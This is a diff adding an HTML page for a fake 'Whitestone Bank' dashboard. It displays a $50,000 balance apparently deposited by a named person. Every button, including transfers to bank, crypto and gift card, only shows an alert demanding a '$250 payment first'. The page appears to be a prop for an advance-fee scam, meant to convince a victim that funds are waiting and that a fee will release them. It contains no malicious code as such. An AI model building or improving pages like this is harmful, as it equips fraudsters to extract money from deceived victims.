@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Whitestone Bank Dashboard</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f9;
+            color: #333;
+        }
+        header {
+            background-color: #0a3d62;
+            color: white;
+            padding: 20px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        .logo img {
+            height: 50px;
+            margin-right: 15px;
+        }
+        .logo h1 {
+            font-size: 24px;
+            margin: 0;
+        }
+        main {
+            padding: 40px 20px;
+            max-width: 700px;
+            margin: auto;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-top: 60px;
+        }
+        .balance-box {
+            background-color: #0a3d62;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .balance-box h2 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .balance-box p {
+            font-size: 32px;
+            font-weight: bold;
+        }
+        .euro {
+            font-size: 18px;
+            opacity: 0.8;
+        }
+        .action-button {
+            background-color: #e3f0ff;
+            color: #0a3d62;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #b0cde8;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+        .action-button:hover {
+            background-color: #c5e0ff;
+        }
+        .transactions {
+            margin-top: 40px;
+        }
+        .transactions h3 {
+            font-size: 20px;
+            color: #0a3d62;
+            margin-bottom: 15px;
+        }
+        .transaction-item {
+            background-color: #f1f5f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            color: #888;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="https://via.placeholder.com/50x50.png?text=W" alt="Bank Logo">
+            <h1>Whitestone Bank</h1>
+        </div>
+    </header>
+    <main>
+        <div class="balance-box">
+            <h2>Account Balance</h2>
+            <p>$50,000.00</p>
+            <div class="euro">€46,520.00</div>
+        </div>
+        <button class="action-button" onclick="alert('Make $250 payment first')">Transfer to My Bank</button>
+        <button class="action-button" onclick="alert('Make $250 payment first')">Transfer to Crypto</button>
+        <button class="action-button" onclick="alert('Make $250 payment first')">Convert to Gift Card</button>
+        <button class="action-button" onclick="alert('Make $250 payment first')">Transfer to Other Bank</button>
+        <button class="action-button" onclick="alert('Make $250 payment first')">Pay Bills</button>
+        <button class="action-button" onclick="alert('Make $250 payment first')">Deposit</button>
+
+        <div class="transactions">
+            <h3>Recent Transactions</h3>
+            <div class="transaction-item">
+                <strong>$50,000.00 Deposited</strong><br>
+                Sarah Hilton<br>
+                <span>May 26, 2025 (Today)</span>
+            </div>
+        </div>
+    </main>
+    <footer>
+        &copy; 2025 Whitestone Bank. All rights reserved.
+    </footer>
+</body>
+</html>
